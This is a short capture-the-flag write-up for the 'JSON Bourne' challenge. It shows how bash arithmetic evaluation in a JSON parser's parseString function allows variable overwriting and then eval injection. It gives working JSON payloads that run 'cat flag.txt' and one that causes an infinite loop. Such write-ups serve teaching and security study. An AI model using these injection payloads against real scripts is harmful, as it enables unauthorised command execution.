# JSON Bourne (misc, 200p, 46 solved) [bash script]


After looking carefully at the code and learning the bash scripting syntax, we found in parser.sh:

```
parseString() {
    local input=$1
    local i=$2
    local res=$3
    declare -Ag $res

    makeVar
    eval ${res}'[_type]=$var_name'
    makeKind "STRING" $var_name

    getString "$input" "$i" "$res"

    local task_i
    local result_str="${!res}"
    for (( task_i=0; task_i < ${#result_str}; task_i++ )); do
        if [[ "${result_str:$task_i:5}" = "task " ]]; then
            local suffix="${result_str:$((task_i+5)):$((${#result_str}-task_i-5))}"
            if [[ "$((suffix > 0))" = "1" && "$((suffix <= 8))" = "1" ]]; then
                local color=$var_name
                normalizeNumber "$suffix" $color "var_"
                eval ${res}'[_color]=${color}'
            fi
        fi
    done
}
```
in particular this line:

```
if [[ "$((suffix > 0))" = "1" && "$((suffix <= 8))" = "1" ]]; then
```

after fuzzying around, we noticed that allows arithmetic assignment, by attempting to use this line:

```
{"task 1=12":"as"}
```

Then we used this vulnerability to rewrite  `_var_name_i`  in such a way that some new variables used in evals would be somehow "double referenced".

We ended up in :

```
["task _var_name_i=10","var_11","task _var_name_i=10",{"task _var_name_i=13":"=SHELL","var_10":"b"},"concat",{"ta":["ta","aT","task _var_name_i=10",{"task _var_name_i=13":"};cat flag.txt;{","var_12":"b"},"l00p"]}]
```

Which, after a grooming phase by @Zom, could also be written as:

```
{"task _var_name_i=10":"};cat flag.txt;#
```

Curiously, changing the value of ` _var_name_i` could also cause the program to loop forever:
```
{"going":["down","task _var_name_i=10",{"the":"rabbit"},"hole"]}
```
